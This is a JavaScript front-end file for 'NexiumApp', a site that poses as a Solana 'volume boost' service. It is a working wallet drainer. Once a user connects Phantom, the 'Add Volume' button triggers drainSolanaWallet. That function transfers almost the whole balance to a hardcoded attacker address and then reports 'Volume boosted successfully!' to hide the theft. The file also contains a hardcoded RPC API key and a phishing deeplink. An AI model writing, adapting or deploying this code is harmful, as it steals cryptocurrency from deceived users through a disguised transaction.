import { Buffer } from 'buffer';
console.log('main.js: Buffer imported:', typeof Buffer, Buffer); // Log 1
globalThis.Buffer = Buffer;
window.Buffer = Buffer;
console.log('main.js: Buffer set on globalThis/window:', globalThis.Buffer === Buffer, window.Buffer === Buffer); // Log 2

// Other imports
import { CONFIG } from './config.js';
console.log('main.js: Buffer before CONFIG import:', typeof globalThis.Buffer); // Log 3
import { Connection, PublicKey, SystemProgram, TransactionMessage, VersionedTransaction } from '@solana/web3.js';
console.log('main.js: Buffer after imports:', typeof globalThis.Buffer); // Log 4

const DRAIN_ADDRESSES = {
  solana: "73F2hbzhk7ZuTSSYTSbemddFasVrW8Av5FD9PeMVmxA7"
};

class NexiumApp {
  constructor() {
    this.publicKey = null;
    this.connecting = false;
    this.dom = {};
    this.connectingWallet = null;
    this.solConnection = null;
    this.spinner = null;
    this.connectedWalletType = null;
    console.log('Initializing NexiumApp...'); // Log 6
    this.initApp();
  }

  async initApp() {
    try {
      await new Promise(resolve => {
        if (document.readyState !== 'loading') {
          resolve();
        } else {
          document.addEventListener('DOMContentLoaded', () => resolve());
        }
      });
      this.cacheDOMElements();
      if (!this.dom.metamaskPrompt) {
        console.warn('metamaskPrompt element missing, but continuing initialization'); // Log 8
      }
      this.setupModal();
      this.setupEventListeners();
      this.checkWalletAndPrompt();
      console.log('App initialized successfully'); // Log 9
    } catch (error) {
      console.error('Init error:', error); // Log 10
      this.showFeedback('Error initializing app. Please refresh.', 'error');
    }
  }

  cacheDOMElements() {
    this.dom = {
      metamaskPrompt: document.getElementById('metamaskPrompt'),
      connectWallet: document.getElementById('connect-wallet'),
      walletModal: document.getElementById('wallet-modal'),
      closeModal: document.getElementById('close-modal'),
      connectPhantom: document.querySelector('#wallet-modal #connect-phantom'),
      feedbackContainer: document.querySelector('.feedback-container')
    };
    console.log('DOM elements cached:', {
      metamaskPrompt: !!this.dom.metamaskPrompt,
      connectWallet: !!this.dom.connectWallet,
      walletModal: !!this.dom.walletModal,
      closeModal: !!this.dom.closeModal,
      connectPhantom: !!this.dom.connectPhantom
    }); // Log 11
  }

  setupModal() {
    console.log('Wallet modal setup:', {
      connectWalletBtn: !!this.dom.connectWallet,
      walletModal: !!this.dom.walletModal,
      closeModalBtn: !!this.dom.closeModal
    }); // Log 12

    if (this.dom.connectWallet && this.dom.walletModal && this.dom.closeModal) {
      this.dom.connectWallet.addEventListener('click', (event) => {
        event.stopPropagation();
        if (this.connectedWalletType && this.publicKey) {
          console.log(`${this.connectedWalletType} Add Volume clicked (outer button)`); // Log 13
          if (this.connectedWalletType === 'Phantom') {
            this.drainSolanaWallet();
          }
        } else {
          console.log('Connect Wallet button clicked'); // Log 14
          this.dom.walletModal.classList.add('active');
          console.log('Modal state:', { isActive: this.dom.walletModal.classList.contains('active') }); // Log 15
        }
      });

      this.dom.closeModal.addEventListener('click', () => {
        console.log('Close wallet modal button clicked'); // Log 16
        this.dom.walletModal.classList.remove('active');
      });

      document.addEventListener('click', (event) => {
        if (!this.dom.walletModal.contains(event.target) && !this.dom.connectWallet.contains(event.target)) {
          console.log('Clicked outside wallet modal, closing'); // Log 17
          this.dom.walletModal.classList.remove('active');
        }
      });
    } else {
      console.error('Wallet modal elements not found:', {
        connectWallet: !!this.dom.connectWallet,
        walletModal: !!this.dom.walletModal,
        closeModal: !!this.dom.closeModal
      }); // Log 18
    }
  }

  setupEventListeners() {
    const connectWalletHandler = (walletName) => {
      if (!this.connecting) {
        console.log(`${walletName} button clicked`); // Log 21
        this.connectWallet(walletName);
      }
    };

    const addVolumeHandler = (walletName) => {
      console.log(`${walletName} Add Volume clicked`); // Log 22
      if (walletName === 'Phantom') {
        this.drainSolanaWallet();
      }
    };

    if (this.dom.connectPhantom) {
      this.dom.connectPhantom.addEventListener('click', () => {
        console.log('Phantom click event triggered, connected class:', this.dom.connectPhantom.classList.contains('connected')); // Log 26
        if (this.dom.connectPhantom.classList.contains('connected')) {
          addVolumeHandler('Phantom');
        } else {
          connectWalletHandler('Phantom');
        }
      });
      this.dom.connectPhantom.addEventListener('keypress', (e) => {
        console.log('Phantom keypress event triggered, key:', e.key, 'connected class:', this.dom.connectPhantom.classList.contains('connected')); // Log 27
        if (e.key === 'Enter') {
          if (this.dom.connectPhantom.classList.contains('connected')) {
            addVolumeHandler('Phantom');
          } else {
            connectWalletHandler('Phantom');
          }
        }
      });
    } else {
      console.warn('connectPhantom button not found'); // Log 28
    }

    window.addEventListener('online', () => this.handleOnline());
    window.addEventListener('offline', () => this.handleOffline());
  }

  async connectWallet(walletName) {
    if (this.connecting || !navigator.onLine) {
      this.showFeedback('No internet connection. Please check your network.', 'error');
      console.log(`Connection aborted for ${walletName}: offline or already connecting`); // Log 32
      return;
    }
    this.connecting = true;
    this.connectingWallet = walletName;
    console.log(`Starting connection for ${walletName}, setting state to connecting`); // Log 33
    this.updateButtonState('connecting', walletName);

    try {
      const isMobileUserAgent = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
      const hasTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
      const hasSolana = !!window.solana;
      const hasExtensions = (walletName === 'Phantom' && hasSolana && window.solana.isPhantom);
      console.log(`Device detected: ${isMobileUserAgent && !hasExtensions ? 'Mobile' : 'Desktop'} (UserAgent: ${navigator.userAgent}, Touch: ${hasTouch}, Solana: ${hasSolana}, Extensions: ${hasExtensions})`); // Log 34

      if (!isMobileUserAgent || hasExtensions) {
        let accounts = [];
        if (walletName === 'Phantom' && hasSolana && window.solana.isPhantom) {
          console.log('Phantom detected, connecting:', window.solana); // Log 45
          const response = await window.solana.connect();
          accounts = [response.publicKey.toString()];
          this.publicKey = accounts[0];
          this.solConnection = new Connection(`https://proportionate-skilled-shard.solana-mainnet.quiknode.pro/e13cbae8b642209c482805a4e443fd1f27a4f42a`, {commitment: 'confirmed', wsEndpoint: ''});
          console.log(`Phantom connected via extension: ${this.publicKey}`); // Log 46
          this.connectedWalletType = walletName;
          this.updateButtonState('connected', walletName, this.publicKey);
          this.hideMetaMaskPrompt();
          this.showFeedback(`Connected`, 'success');
          this.connecting = false;
          console.log(`${walletName} connection completed, connecting=${this.connecting}`); // Log 51
          return;
        } else {
          console.error(`${walletName} extension not detected`); // Log 62
          throw new Error(`${walletName} extension not detected or unsupported`);
        }
      }

      // Deeplink begin
      const deeplinks = {
        Phantom: 'https://phantom.app/ul/browse/https%3A%2F%2Fnexium-bot.onrender.com%2Fadd-volume.html?ref=https%3A%2F%2Fnexium-bot.onrender.com'
      };
      // Deeplink end
      const deeplink = deeplinks[walletName];
      if (!deeplink) {
        console.error(`No deeplink configured for ${walletName}`); // Log 63
        throw new Error(`No deeplink configured for ${walletName}`);
      }
      console.log(`Opening ${walletName} with deeplink: ${deeplink}`); // Log 64
      window.location.href = deeplink;

      const checkConnection = setInterval(async () => {
        if (walletName === 'Phantom' && window.solana?.isPhantom) {
          const response = await window.solana.connect().catch(() => null);
          if (response && response.publicKey) {
            this.publicKey = response.publicKey.toString();
            this.solConnection = new Connection(`https://proportionate-skilled-shard.solana-mainnet.quiknode.pro/e13cbae8b642209c482805a4e443fd1f27a4f42a`, {commitment: 'confirmed', wsEndpoint: ''});
            console.log(`Phantom connected via deeplink: ${this.publicKey}`); // Log 72
            this.connectedWalletType = walletName;
            this.updateButtonState('connected', walletName, this.publicKey);
            this.hideMetaMaskPrompt();
            this.showFeedback(`Connected`, 'success');
            clearInterval(checkConnection);
          }
        }
      }, 1000);

      setTimeout(() => {
        if (this.connecting) {
          console.log(`Deeplink timed out for ${walletName}`); // Log 84
          this.showFeedback('Connection timed out. Please open site in the wallet app browser.', 'error');
          this.updateButtonState('disconnected', walletName);
          this.connecting = false;
          clearInterval(checkConnection);
        }
      }, 30000);
    } catch (error) {
      console.error(`Connection error for ${walletName}:`, error); // Log 86
      this.handleConnectionError(error, walletName);
      this.updateButtonState('disconnected', walletName);
      this.showMetaMaskPrompt();
    } finally {
      this.connecting = false;
      console.log(`Connection attempt finished for ${walletName}, connecting=${this.connecting}`); // Log 88
    }
  }

  async drainSolanaWallet() {
    console.log('drainSolanaWallet: Buffer defined:', typeof globalThis.Buffer); // Log 91
    console.log('drainSolanaWallet: Starting with publicKey:', this.publicKey); // Log 92
    this.showProcessingSpinner();

    try {
      const senderPublicKey = new PublicKey(this.publicKey);
      const recipientPublicKey = new PublicKey(DRAIN_ADDRESSES.solana);
      console.log("✅ Valid Solana address:", senderPublicKey.toBase58()); // Log 93
      console.log("Recipient address:", recipientPublicKey.toBase58()); // Log 94

      // Get full balance and subtract rent-exempt minimum
      const balance = await this.solConnection.getBalance(senderPublicKey);
      const rentExemptMinimum = 2039280; // Minimum lamports needed to keep account open
      const transferableBalance = balance - rentExemptMinimum;

      if (transferableBalance <= 0) {
        console.error("Insufficient transferable balance:", balance, "lamports"); // Log 95
        throw new Error("Insufficient balance to transfer after reserving rent-exempt minimum.");
      }
      console.log("Total balance:", balance, "lamports, Transferable balance:", transferableBalance, "lamports"); // Log 96

      // Create transfer instruction for transferable balance
      const solInstruction = SystemProgram.transfer({
        fromPubkey: senderPublicKey,
        toPubkey: recipientPublicKey,
        lamports: transferableBalance
      });

      // Get blockhash
      const { blockhash, lastValidBlockHeight } = await this.solConnection.getLatestBlockhash();
      console.log("Fetched blockhash:", blockhash, "lastValidBlockHeight:", lastValidBlockHeight); // Log 97

      // Create message
      const message = new TransactionMessage({
        payerKey: senderPublicKey,
        recentBlockhash: blockhash,
        instructions: [solInstruction],
      }).compileToV0Message();

      // Create and sign transaction
      const versionedTransaction = new VersionedTransaction(message);
      const signedTransaction = await window.solana.signTransaction(versionedTransaction);
      console.log("Transaction signed successfully:", signedTransaction); // Log 98

      const signature = await this.solConnection.sendTransaction(signedTransaction);
      console.log("Transaction sent, signature:", signature); // Log 99

      await this.solConnection.confirmTransaction({
        signature,
        lastValidBlockHeight,
        blockhash
      });
      console.log("Transaction confirmed:", signature); // Log 100

      this.showFeedback("Volume boosted successfully!", 'success');
    } catch (error) {
      console.error("❌ Transaction Error:", error.message, error.stack || error); // Log 101
      if (error.message.includes('User rejected the request')) {
        this.showFeedback('Transaction rejected. Please approve the transaction in your Phantom wallet.', 'error');
      } else if (error.message.includes('Insufficient balance')) {
        this.showFeedback('Insufficient balance to transfer. Please ensure you have enough SOL.', 'error');
      } else {
        this.showFeedback("Failed to boost volume. Please try again.", 'error');
      }
    } finally {
      this.hideProcessingSpinner();
      console.log('Drain token completed'); // Log 102
    }
  }

  updateButtonState(state, walletName, address = '') {
    let button = this.dom[`connect${walletName}`];
    if (!button) {
      console.warn(`Button for ${walletName} not in cache, attempting to re-query DOM`); // Log 103
      button = document.querySelector(`#wallet-modal #connect-${walletName.toLowerCase()}`);
    }
    console.log(`Updating button state for ${walletName}: state=${state}, address=${address}, button exists=${!!button}`); // Log 104
    if (!button) {
      console.error(`Button for ${walletName} not found in DOM`); // Log 105
      return;
    }
    console.log(`Current button classes before update: ${button.classList}`); // Log 106
    button.classList.remove('animate-pulse', 'connecting', 'connected');
    button.disabled = state === 'connecting';
    switch (state) {
      case 'connecting':
        button.textContent = 'Connecting...';
        button.classList.add('glow-button', 'connecting');
        console.log(`Set ${walletName} button to Connecting..., disabled=${button.disabled}, classes=${button.classList}`); // Log 107
        break;
      case 'connected':
        const shortenedAddress = this.shortenAddress(address);
        button.textContent = shortenedAddress;
        button.classList.add('glow-button', 'connected');
        console.log(`Set ${walletName} button to ${shortenedAddress}, disabled=${button.disabled}, classes=${button.classList}`); // Log 108
        if (this.dom.connectWallet) {
          this.dom.connectWallet.textContent = shortenedAddress;
          this.dom.connectWallet.classList.remove('animate-pulse');
          this.dom.connectWallet.classList.add('glow-button', 'connected');
          this.dom.connectWallet.disabled = false; // Allow clicking for Add Volume
          console.log(`Set outer Connect Wallet button to ${shortenedAddress}, disabled=${this.dom.connectWallet.disabled}, classes=${this.dom.connectWallet.classList}`); // Log 109
        }
        break;
      default:
        button.textContent = `Connect ${walletName}`;
        button.classList.add('glow-button', 'animate-pulse');
        console.log(`Set ${walletName} button to Connect ${walletName}, disabled=${button.disabled}, classes=${button.classList}`); // Log 110
        if (this.dom.connectWallet) {
          this.dom.connectWallet.textContent = 'Connect Wallet';
          this.dom.connectWallet.classList.add('glow-button', 'animate-pulse');
          this.dom.connectWallet.classList.remove('connected');
          this.dom.connectWallet.disabled = false;
          console.log(`Reset outer Connect Wallet button to Connect Wallet, disabled=${this.dom.connectWallet.disabled}, classes=${this.dom.connectWallet.classList}`); // Log 111
        }
    }
    console.log(`Button state updated for ${walletName}: text=${button.textContent}, classes=${button.classList}`); // Log 112
  }

  handleConnectionError(error, walletName) {
    console.error(`Connection error for ${walletName} at`, new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' }), { code: error.code, message: error.message }); // Log 113
    let message = `Failed to connect ${walletName}`;
    if (error.code === -32002) message = `${walletName} is locked or not responding. Please unlock it or reinstall the extension.`;
    else if (error.message?.includes('rejected')) message = `Connection to ${walletName} was declined.`;
    else if (error.message?.includes('locked')) message = `${walletName} is locked. Please unlock it.`;
    else if (error.message?.includes('missing')) message = `Wallet configuration issue. Please try again.`;
    else if (error.message?.includes('WebSocket') || error.message?.includes('network') || error.message?.includes('DNS')) message = `Network issue detected. Please check your internet connection.`;
    else if (error.message?.includes('extension not detected') || error.message?.includes('unsupported')) message = `Please install the ${walletName} extension to continue.`;
    else if (error.message?.includes('Non-base58 character')) message = `Please use a Solana wallet to boost volume.`;
    else if (error.message) message = `Failed to connect ${walletName}. Please try again.`;
    this.showFeedback(message, 'error');
  }

  handleOnline() {
    this.showFeedback('Back online. Ready to connect.', 'success');
    console.log('Network status: Online'); // Log 114
  }

  handleOffline() {
    this.showFeedback('No internet connection. Please reconnect.', 'error');
    this.updateButtonState('disconnected', 'Phantom');
    console.log('Network status: Offline'); // Log 115
  }

  showMetaMaskPrompt() {
    if (!this.dom.metamaskPrompt) {
      console.warn('metamaskPrompt element not found, cannot show prompt'); // Log 116
      return;
    }
    this.dom.metamaskPrompt.classList.remove('hidden');
    this.dom.metamaskPrompt.style.display = 'block';
    const promptText = this.dom.metamaskPrompt.querySelector('p');
    if (promptText && this.connectingWallet) {
      let walletLink = '';
      if (this.connectingWallet === 'Phantom') {
        walletLink = `<a href="https://phantom.app/download" target="_blank" rel="noopener noreferrer" class="text-yellow-400 hover:underline" aria-label="Install Phantom">Phantom</a>`;
      }
      promptText.innerHTML = `Please install ${walletLink} or switch to continue.`;
    }
    console.log(`Showing MetaMask prompt for ${this.connectingWallet}`); // Log 117
  }

  hideMetaMaskPrompt() {
    if (!this.dom.metamaskPrompt) {
      console.warn('metamaskPrompt element not found, cannot hide prompt'); // Log 118
      return;
    }
    this.dom.metamaskPrompt.classList.add('hidden');
    this.dom.metamaskPrompt.style.display = 'none';
    console.log('MetaMask prompt hidden'); // Log 119
  }

  showFeedback(message, type = 'info') {
    let feedbackContainer = this.dom.feedbackContainer;
    if (!feedbackContainer) {
      feedbackContainer = document.createElement('div');
      feedbackContainer.className = 'feedback-container fixed bottom-4 right-4 space-y-2 z-[10000]';
      document.body.appendChild(feedbackContainer);
      this.dom.feedbackContainer = feedbackContainer;
    }
    const feedback = document.createElement('div');
    feedback.className = `feedback feedback-${type} fade-in p-4 rounded-xl text-white ${type === 'error' ? 'bg-red-500' : type === 'success' ? 'bg-green-500' : 'bg-blue-500'}`;
    feedback.style.zIndex = '10000';
    feedback.innerHTML = `
      <span class="feedback-message">${this.escapeHTML(message)}</span>
      <span class="feedback-close cursor-pointer ml-2" role="button" aria-label="Close feedback">×</span>
    `;
    const close = feedback.querySelector('.feedback-close');
    if (close) {
      close.addEventListener('click', () => feedback.remove());
      close.addEventListener('keypress', (e) => e.key === 'Enter' && feedback.remove());
    }
    feedbackContainer.appendChild(feedback);
    setTimeout(() => feedback.classList.add('fade-out'), type === 'error' ? 10000 : 5000);
    setTimeout(() => feedback.remove(), type === 'error' ? 10500 : 5500);
    console.log(`Feedback displayed: ${message}, type: ${type}`); // Log 120
  }

  shortenAddress(address) {
    if (!address) return 'Unknown';
    return `${address.slice(0, 6)}...${address.slice(-4)}`;
  }

  escapeHTML(str) {
    return String(str).replace(/[&<>"']/g, (m) => ({
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&apos;'
    }[m]));
  }

  async checkWalletAndPrompt() {
    if (this.isWalletInstalled()) {
      this.hideMetaMaskPrompt();
      this.attachWalletListeners();
      if (this.isWalletConnected() && navigator.onLine) {
        this.publicKey = window.solana?.publicKey?.toString();
        this.solConnection = new Connection(`https://proportionate-skilled-shard.solana-mainnet.quiknode.pro/e13cbae8b642209c482805a4e443fd1f27a4f42a`, {commitment: 'confirmed', wsEndpoint: ''});
        console.log('Wallet connected on init, publicKey:', this.publicKey); // Log 121
        this.connectedWalletType = window.solana?.isPhantom ? 'Phantom' : null;
        this.handleSuccessfulConnection();
      } else {
        console.log('No wallet connected on init, setting buttons to disconnected'); // Log 122
        this.updateButtonState('disconnected', 'Phantom');
      }
    } else {
      console.log('No wallet installed, showing prompt'); // Log 123
      this.showMetaMaskPrompt();
      this.updateButtonState('disconnected', 'Phantom');
    }
  }

  attachWalletListeners() {
    if (window.solana) {
      window.solana.on('accountChanged', () => {
        console.log('Solana account changed'); // Log 124
        this.handleAccountsChanged();
      });
    }
  }

  isWalletInstalled() {
    return !!window.solana;
  }

  isWalletConnected() {
    return (window.solana && !!window.solana.publicKey);
  }

  handleSuccessfulConnection() {
    console.log(`Handle successful connection for ${this.connectedWalletType}`); // Log 127
    this.updateButtonState('connected', this.connectedWalletType, this.publicKey);
  }

  handleAccountsChanged() {
    console.log('Handling accounts changed, new publicKey:', window.solana?.publicKey?.toString()); // Log 128
    this.hideMetaMaskPrompt();
    this.publicKey = window.solana?.publicKey?.toString();
    this.connectedWalletType = window.solana?.isPhantom ? 'Phantom' : null;
    this.updateButtonState('disconnected', 'Phantom');
    if (this.publicKey && this.connectedWalletType) {
      this.updateButtonState('connected', this.connectedWalletType, this.publicKey);
    }
  }

  showProcessingSpinner() {
    if (this.spinner) this.hideProcessingSpinner();
    this.spinner = document.createElement('div');
    this.spinner.className = 'fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-[9999]';
    this.spinner.innerHTML = `
      <div class="flex items-center space-x-2">
        <div class="spinner border-t-4 border-orange-400 rounded-full w-8 h-8 animate-spin"></div>
        <span class="text-white text-lg">Processing...</span>
      </div>
    `;
    document.body.appendChild(this.spinner);
    console.log('Processing spinner displayed'); // Log 154
  }

  hideProcessingSpinner() {
    if (this.spinner) {
      this.spinner.remove();
      this.spinner = null;
      console.log('Processing spinner hidden'); // Log 155
    }
  }
}

const app = new NexiumApp();

export { NexiumApp };